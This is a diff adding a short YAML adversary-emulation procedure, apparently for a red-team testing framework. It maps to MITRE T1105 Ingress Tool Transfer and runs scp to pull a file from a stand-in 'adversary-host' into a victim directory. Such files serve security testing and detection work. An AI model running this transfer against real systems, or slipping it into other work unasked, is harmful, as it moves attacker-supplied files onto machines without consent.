@@ -1,0 +1,35 @@
+api_version: "2.0"
+name: scp remote file copy (pull)
+description: |
+    Utilize scp to perform a remote file copy (pull)
+args:
+    - name: remote_host
+      type: string
+      default: adversary-host
+    - name: local_path
+      type: path
+      default: /tmp/victim-files/
+    - name: remote_file
+      type: path
+      default: /tmp/adversary-scp
+    - name: username
+      type: string
+      default: adversary
+uuid: b9d22b9a-9778-4426-abf0-568ea64e9c33
+mitre:
+    tactics:
+        - 'TA0011: Command and Control'
+    techniques:
+        - 'T1105: Ingress Tool Transfer'
+requirements:
+    platforms:
+        - os: linux
+        - os: darwin
+steps:
+    - name: scp-remote-file-copy-(pull)
+      inline: |
+        scp {{.Args.username}}@{{.Args.remote_host}}:{{.Args.remote_file}} {{.Args.local_path}}
+      executor: sh
+      cleanup:
+        inline: ""
+        executor: sh
